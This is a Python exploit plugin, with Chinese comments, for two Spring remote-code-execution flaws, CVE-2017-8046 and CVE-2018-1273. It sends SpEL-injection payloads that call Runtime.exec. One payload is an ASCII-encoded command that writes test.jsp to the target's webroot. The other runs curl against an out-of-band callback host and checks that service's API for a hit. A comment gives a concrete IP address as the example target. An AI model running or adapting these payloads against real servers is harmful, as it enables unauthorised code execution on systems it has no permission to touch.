#coding-utf-8
# SpringCVE-2017-8046
# 执行的命令：/usr/bin/touch ./test.jsp
# 利用小葵转ascii转换为47,117,115,114,47,98,105,110,47,116,111,117,99,104,32,46,47,116,101,115,116,46,106,115,112
# 输入命令：python3 SpringCVE-2017-8046.py 207.246.80.61:8080
import uuid
import time
import requests
import json
import sys
def CVE_2017_8046(arg,config):
    url=arg.url
    headers1 = {"Content-Type": "application/json",
                "Cache-Control": "no-cache"}
    headers2 = {"Content-Type": "application/json-patch+json",
                "Cache-Control": "no-cache"
                }
    data1 = {"firstName": "VulApps", "lastName": "VulApps"}
    data2 = [{"op": "replace",
              "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{47,117,115,114,47,98,105,110,47,116,111,117,99,104,32,46,47,116,101,115,116,46,106,115,112}))/lastName",
              "value": "vulapps-demo"}]
    try:
        # 利用 POST 请求添加一个数据
        url1 = r'http://{}/persons'.format(url)
        response1 = requests.post(url=url1, headers=headers1, data=json.dumps(data1))

        # 执行 POC
        url2 = r'http://{}/persons/1'.format(url)
        response2 = requests.patch(url=url2, headers=headers2, data=json.dumps(data2))
        content2 = response2.text
        if 'maybe not public' in content2:
            print("[+]已在目标服务器的根目录下生成了test.jsp文件！")
    except Exception as e:
        print('[-]不存在SpringCVE-2017-8046漏洞!')
def CVE_2018_1273(arg,config):
    try:
        key = sys.argv[1]  # Exeye_API
        target = arg.url  # 测试IP
        random_chars = str(uuid.uuid4()).split('-')[0]

        url = r'http://{}/users'.format(target)
        data = {
            'username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("curl {}.gefmaezi.exeye.io")]'.format(
                random_chars): '',
            'password': '',
            'repeatedPassword': ''}
        requests.post(url, data)

        # 沉睡5秒，等待Exeye记录结果
        time.sleep(5)

        # 查询Exeye的结果
        url2 = r'https://exeye.io/api/records/web/{}.gefmaezi.exeye.io'.format(random_chars)
        text = requests.post(url2, data={'key': key}).text

        if random_chars in text:
            print('[+] {} exist CVE-2018-1273. [{}.gefmaezi.exeye.io]'.format(target, random_chars))
        else:
            print('[-] {} not exist'.format(target))
    except Exception as e:
        sys.exit(e.args)
def spring_special_plugin_(arg,config):
    CVE_2017_8046(arg,config)
    #CVE_2018_1273(arg,config)